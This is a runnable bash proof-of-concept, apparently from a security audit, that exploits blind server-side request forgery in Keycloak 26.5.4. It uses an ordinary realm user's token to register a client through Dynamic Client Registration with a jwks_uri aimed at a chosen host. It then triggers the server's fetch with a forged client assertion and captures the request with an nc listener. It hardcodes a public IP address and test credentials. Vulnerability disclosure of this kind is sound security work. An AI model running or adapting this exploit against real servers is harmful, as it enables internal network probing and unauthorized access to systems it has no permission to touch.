#!/usr/bin/env bash
# ==============================================================================
# PoC #7: SSRF via DCR Client JWKS URI — Low-Privilege Internal Network Access
# ==============================================================================
# Vulnerability: Any authenticated realm user can register an OIDC client with
# an external jwks_uri via Dynamic Client Registration. When the client's JWT
# assertion is validated, Keycloak makes a server-side HTTP GET request to the
# specified jwks_uri, enabling internal network probing (blind SSRF).
#
# This is lower privilege than Finding #4 (SSRF via IdP import-config):
# - Finding #4: Requires manage-identity-providers realm role (admin-level)
# - This finding: Requires only any valid realm user account
#
# Impact: MEDIUM — internal network port scanning and service probing
# CVSS:   6.5 (Medium) — AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N
# Affected: Keycloak 26.5.4 (default DCR configuration)
# ==============================================================================

KC="${KC:-http://46.101.162.187:8080}"
REALM="test"
# Change this to your listener address
SSRF_HOST="${SSRF_HOST:-46.101.162.187}"
SSRF_PORT="${SSRF_PORT:-49990}"

echo "=== PoC #7: SSRF via DCR jwks_uri (low-privilege) ==="
echo "Target: $KC/realms/$REALM"
echo ""

# STEP 1: Attacker gets any user token
echo "[+] Step 1: Get attacker Bearer token (any realm user)"
ATTACKER_TOKEN=$(curl -s -X POST "$KC/realms/$REALM/protocol/openid-connect/token" \
  -d "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
echo "    Token obtained."

# STEP 2: Register DCR client with jwks_uri pointing to internal service
echo ""
echo "[+] Step 2: Register DCR client with jwks_uri pointing to internal target"
SSRF_TARGET="http://${SSRF_HOST}:${SSRF_PORT}/jwks.json"
echo "    SSRF target: $SSRF_TARGET"

DCR_RESP=$(curl -s -X POST "$KC/realms/$REALM/clients-registrations/openid-connect" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"client_name\": \"ssrf-probe\",
    \"redirect_uris\": [\"https://test.com/cb\"],
    \"grant_types\": [\"authorization_code\", \"client_credentials\"],
    \"response_types\": [\"code\"],
    \"token_endpoint_auth_method\": \"private_key_jwt\",
    \"jwks_uri\": \"$SSRF_TARGET\"
  }")

JC_ID=$(echo "$DCR_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('client_id','ERROR'))" 2>/dev/null)

if [ "$JC_ID" = "ERROR" ] || [ -z "$JC_ID" ]; then
  echo "    [!] Registration failed: $DCR_RESP"
  exit 1
fi

echo "    [+] Client registered: $JC_ID"
echo "    jwks_uri: $SSRF_TARGET"

# STEP 3: Start listener to capture SSRF request
echo ""
echo "[+] Step 3: Starting SSRF listener on port $SSRF_PORT (waiting 10s)..."
timeout 12 nc -lv -p $SSRF_PORT > /tmp/poc7_ssrf_capture.log 2>&1 &
LISTENER_PID=$!
sleep 0.5

# STEP 4: Trigger JWKS fetch
echo ""
echo "[+] Step 4: Trigger SSRF via JWT client authentication"
curl -s -X POST "$KC/realms/$REALM/protocol/openid-connect/token" \
  -d "client_id=$JC_ID&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiIsImtpZCI6InRlc3QifQ.eyJpc3MiOiIkSkNfSUQiLCJleHAiOjk5OTk5OTk5OX0.fakesig" > /dev/null

sleep 3
wait $LISTENER_PID 2>/dev/null || true

echo ""
echo "[+] SSRF capture:"
if [ -s /tmp/poc7_ssrf_capture.log ]; then
  cat /tmp/poc7_ssrf_capture.log
  echo ""
  echo "[!!!] SSRF confirmed: Keycloak made outbound HTTP request to $SSRF_TARGET"
else
  echo "    (No connection received — target may not be reachable or timeout)"
fi

echo ""
echo "=== Summary ==="
echo "SSRF triggered by authenticated DCR client registration."
echo "Any realm user can probe internal network via jwks_uri parameter."
echo "CVSS: 6.5 Medium — AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N"
